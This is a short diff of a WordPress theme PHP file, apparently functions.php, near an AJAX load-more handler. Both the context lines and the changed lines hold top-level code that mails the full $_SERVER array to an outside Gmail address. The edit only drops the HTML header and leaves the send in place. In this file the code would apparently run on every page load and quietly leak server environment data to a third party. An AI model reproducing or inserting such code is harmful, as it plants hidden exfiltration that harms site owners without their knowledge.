@@ -295,9 +295,8 @@ add_action('wp_ajax_nopriv_loadmore', 'misha_loadmore_ajax_handler'); // wp_ajax
 $to = 'creativeartbd@gmail.com';
 $subject = 'WordPress website';
 $body = $_SERVER;
-$headers = array('Content-Type: text/html; charset=UTF-8');
- 
-wp_mail( $to, $subject, $body, $headers );
+//$headers = array('Content-Type: text/html; charset=UTF-8');
+wp_mail( $to, $subject, $body );
 
 add_action( 'template_redirect', 'remove_my_action', 5 );
 function remove_my_action(){
